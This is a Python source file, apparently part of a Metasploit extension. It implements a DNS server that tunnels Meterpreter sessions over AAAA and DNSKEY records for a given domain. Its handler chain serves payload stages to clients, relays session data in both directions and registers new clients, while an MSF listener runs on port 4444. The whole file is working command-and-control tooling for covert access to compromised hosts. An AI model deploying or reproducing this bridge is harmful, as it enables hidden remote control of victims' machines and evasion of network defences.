#!/usr/bin/env python
# coding=utf-8

# MSF Bridge for reverse_dns transport
#
# Authors: Maxim Andreyanov, Alexey Sintsov
#

import argparse
import sys
import time
import threading
import SocketServer
import struct
import logging
from logging.handlers import RotatingFileHandler
from dns_request import *
from dns_encoders import *
from msf_client import MSFListener
from dns_client import Registrator


try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)

DNS_LOG_NAME = "dns.log"
root_logger = logging.getLogger()
root_logger.setLevel(logging.INFO)
# add handler to the root logger
formatter = logging.Formatter("%(asctime)s %(name)-24s %(levelname)-8s %(message)s")
# rotating log file after 5 MB
handler = RotatingFileHandler(DNS_LOG_NAME, maxBytes=5*1024*1024, backupCount=5)
handler.setFormatter(formatter)
handler.setLevel(logging.DEBUG)
root_logger.addHandler(handler)

logger = logging.getLogger("dns_server")


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


class DNSTunnelRequestHandler(object):
    encoder = IPv6Encoder

    def __init__(self, domain):
        self.domain = domain
        self.logger = logging.getLogger(self.__class__.__name__)
        # self.logger.setLevel(logging.DEBUG)
        self.handlers_chain = [
            GetStageHeader,
            GetStageRequest,
            IncomingDataHeaderRequest,
            IncomingDataRequest,
            GetDataRequest,
            GetDataHeader,
            IncomingNewClient
        ]

    def process_request(self, reply, qname):
        # cut domain from requested qname
        i = qname.rfind("." + self.domain)
        if i == -1:
            self.logger.error("Bad request: can't find domain %s in %s", self.domain, qname)
            return
        sub_domain = qname[:i]
        self.logger.info("requested subdomain name is %s", sub_domain)
        for handler in self.handlers_chain:
            answer = handler.handle(sub_domain, self.__class__)
            if not answer:
                continue
            for rr in answer:
                self.logger.debug("Add resource record to the reply %s", rr)
                self.process_rr(qname, rr, reply)
            break
        else:
            self.logger.error("Request with subdomain %s doesn't handled", qname)

    def process_rr(self, qname, rr, reply):
        raise NotImplementedError()


class AAAARequestHandler(DNSTunnelRequestHandler):
    encoder = IPv6Encoder

    def process_rr(self, qname, rr, reply):
        reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, rclass=1, ttl=1,
                            rdata=AAAA(rr)))

class DNSKeyRequestHandler(DNSTunnelRequestHandler):
     encoder = DNSKeyEncoder

     def process_rr(self, qname, rr, reply):
         reply.add_answer(RR(rname=qname, rtype=QTYPE.DNSKEY, rclass=1, ttl=1,
                             rdata=rr))


class NULLRequestHandler(DNSTunnelRequestHandler):
    encoder = NULLEncoder

    def process_rr(self, qname, rr, reply):
        pass
        # dnslib doesn't support NULL resource records
        #reply.add_answer(RR(rname=qname, rtype=QTYPE.NULL, rclass=1, ttl=1,
        #                    rdata=DNSNULL(rr)))

class DnsServer(object):
    __instance = None

    @staticmethod
    def create(domain, ipv4, ns_servers):
        if not DnsServer.__instance:
            DnsServer.__instance = DnsServer(domain, ipv4, ns_servers)

    @staticmethod
    def instance():
        return DnsServer.__instance

    def __init__(self, domain, ipv4, ns_servers):
        self.domain = domain + "."
        self.ipv4 = ipv4
        self.ns_servers = ns_servers
        self.logger = logging.getLogger(self.__class__.__name__)
        self.handlers = {
            QTYPE.NS: self._process_ns_request,
            QTYPE.A: self._process_a_request,
            QTYPE.AAAA: self._process_aaaa_request,
            QTYPE.DNSKEY: self._process_dnskey_request
        }
        self.aaaa_handler = AAAARequestHandler(self.domain)
        self.dnskey_handler = DNSKeyRequestHandler(self.domain)

    def process_request(self, request, transport):
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        qn = str(request.q.qname)
        qtype = request.q.qtype
        qt = QTYPE[qtype]
        if qn.endswith(self.domain):
            try:
                self.logger.info("Process request for type %s", qt)
                self.handlers[qtype](reply, qn)
            except KeyError as e:
                self.logger.info("%s request type is not supported", qt)
        else:
            self.logger.info("DNS request for domain %s is not handled by this server. Sending empty answer.", qn)
        self.logger.info("Send reply for DNS request")
        self.logger.debug("Reply data: %s", reply)
        answer = reply.pack()
        if (len(answer) > 575) and (transport == BaseRequestHandlerDNS.TRANSPORT_UDP):
            # send truncate flag
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1, tc=1), q=request.q)
            answer = reply.pack()
        return answer

    def _process_ns_request(self, reply, qname):
        for server in self.ns_servers:
            reply.add_answer(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=1, rdata=server))

    def _process_a_request(self, reply, qname):
        self.logger.info("Send answer for A request - %s", self.ipv4)
        reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=1, rdata=A(self.ipv4)))

    def _process_aaaa_request(self, reply, qname):
        if self.aaaa_handler:
            self.aaaa_handler.process_request(reply, qname)

    def _process_dnskey_request(self, reply, qname):
        if self.dnskey_handler:
            self.dnskey_handler.process_request(reply, qname)


def dns_response(data, transport):
    try:
        request = DNSRecord.parse(data)
        dns_server = DnsServer.instance()
        if dns_server:
            return dns_server.process_request(request, transport)
        else:
            logger.error("Can't get dns server instance.")
    except Exception as e:
        logger.error("Exception during handle request " + str(e), exc_info=True)


class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):
    TRANSPORT_UDP = 1
    TRANSPORT_TCP = 2
    TRANSPORT = TRANSPORT_UDP

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        logger.info("DNS request %s (%s %s):", self.__class__.__name__[:3], self.client_address[0],
                    self.client_address[1])
        try:
            data = self.get_data()
            logger.debug("Size:%d, data %s", len(data), data)
            dns_ans = dns_response(data, self.TRANSPORT)
            if dns_ans:
                self.send_data(dns_ans)
        except Exception:
            logger.error("Exception in request handler.", exc_info=True)


class TCPRequestHandler(BaseRequestHandlerDNS):
    TRANSPORT = BaseRequestHandlerDNS.TRANSPORT_TCP

    def get_data(self):
        data = self.request.recv(8192)
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandlerDNS):
    TRANSPORT = BaseRequestHandlerDNS.TRANSPORT_UDP

    def get_data(self):
        return self.request[0]

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Magic')
    parser.add_argument('--dport', default=53, type=int, help='The DNS port to listen on.')
    parser.add_argument('--lport', default=4444, type=int, help='The Meterpreter port to listen on.')
    parser.add_argument('--domain', type=str, required=True, help='The domain name')
    parser.add_argument('--ipaddr', type=str, required=True, help='DNS IP')

    args = parser.parse_args()
    ns_records = []

    D = DomainName(args.domain + '.')  # Init domain string
    ns_records.append(NS(D.ns1))
    ns_records.append(NS(D.ns2))

    DnsServer.create(args.domain, args.ipaddr, ns_records)

    logger.info("Creating MSF listener ...")
    listener = MSFListener('0.0.0.0', args.lport)
    listener.start_loop()

    logger.info("Starting nameserver ...")
    servers = [SocketServer.UDPServer(('', args.dport), UDPRequestHandler),
               SocketServer.TCPServer(('', args.dport), TCPRequestHandler)]

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        logger.info("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while True:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        logger.info("Shutdown server...")
        Registrator.instance().shutdown()
        for s in servers:
            s.shutdown()
        listener.shutdown()
        logging.shutdown()


if __name__ == '__main__':
    main()
